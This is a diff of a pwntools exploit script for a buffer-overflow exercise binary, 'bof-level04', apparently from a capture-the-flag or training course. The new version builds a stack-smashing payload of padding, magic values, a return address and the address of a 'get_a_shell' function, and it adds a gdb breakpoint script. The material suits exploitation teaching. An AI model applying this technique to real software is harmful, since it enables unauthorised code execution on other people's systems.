@@ -2,24 +2,18 @@
 from pwn import *
 import os
 
-DEBUG = False # toggles gdb.debug or process
 elf = ELF('./bof-level04') # replace this with the actual level
-get_a_shell = p32(elf.symbols["get_a_shell"])
-
-# crash the process to get a core file and find the buffer address (still boilerplate)
-
-# io = elf.process(env={}, setuid=False)
-# io.sendline(cyclic(10000)) # send 1000 junk characters
-# io.wait()
-# core = io.corefile
-# buffer_address = core.stack.find(cyclic(50))
-# os.unlink(core.path) # delete the file now that we're done with it
+DEBUG = False # toggles gdb.debug or process
 
 # launch the main process (still boilerplate)
 if DEBUG:
     context.log_level = 'DEBUG'
     context.terminal = ['tmux', 'splitw', '-h']
-    io = elf.debug(env={})
+    io = elf.debug(env={}, gdbscript="""
+b main
+continue
+""")
+
 else:
     io = elf.process(env={})
 
@@ -27,14 +21,18 @@ else:
 # END SETUP BOILERPLATE
 # BEGIN CHALLENGE-SPECIFIC CODE
 
-buf_len = 0x80 - 0x8
+get_a_shell = p32(elf.symbols["get_a_shell"])
 
-buffer_start = 0xffffd400
-our_stack =  b"A" * 4 + get_a_shell
-our_stack_len = 0x8 
-our_stack_addr = buffer_start + buffer_len - our_stack_len 
+buf_len = 20
 
-payload = ("A" * buf_len - our_stack_len) + our_stack  + our_stack_addr
+a = 0x48474645 
+b = 0x44434241
+
+ret_addr = p32(0x804876b)
+main_base = 0xffffde28
+main_end  = 0xffffde10
+
+payload = b"A" * buf_len + p32(b) + p32(a) + b"A" * 8 + ret_addr + (main_base - main_end + 4) * b"A" + get_a_shell
 io.sendline(payload)
 
 # END CHALLENGE-SPECIFIC CODE
